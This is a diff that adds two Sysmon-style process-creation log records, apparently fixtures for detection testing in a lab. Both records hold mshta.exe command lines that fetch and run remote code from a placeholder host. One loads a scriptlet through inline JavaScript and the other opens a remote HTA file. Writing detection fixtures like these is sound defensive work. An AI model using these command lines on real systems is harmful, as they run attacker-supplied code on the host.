@@ -1,0 +1,2 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\mshta.exe", "OriginalFileName": "MSHTA.EXE", "CommandLine": "mshta.exe javascript:a=(GetObject(\"script:https://example.com/test.sct\")).Exec();close();", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "LAB\\analyst"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\mshta.exe", "OriginalFileName": "MSHTA.EXE", "CommandLine": "mshta.exe https://example.com/app.hta", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "LAB\\analyst"}
